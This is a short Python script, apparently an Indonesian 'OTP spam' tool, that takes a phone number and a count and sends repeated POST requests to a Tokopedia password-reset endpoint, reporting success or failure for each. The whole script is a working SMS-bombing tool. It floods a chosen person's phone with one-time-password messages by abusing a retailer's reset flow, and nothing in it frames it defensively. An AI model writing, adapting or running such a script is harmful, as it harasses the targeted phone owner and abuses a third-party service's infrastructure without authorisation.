import requests, time

print("""
	[ HALLODOK OTP ]
	    -noobie-
""")

num=input("[In] Nomor: ")
jum=int(input("[In] Jumlah: "))

print("\n[RESULT]")
for x in range(jum):
	try:
		req=requests.post("https://m.tokopedia.com/reset-password",
			data={"number":num})
		if req.json()['status'] == 'ok':
			print(f"{x+1}. Berhasil {num}")
		else:
			print(f"{x+1}. Gagal {num}")
	except Exception as e:
		print(f"{x+1}. Pass: {e}")
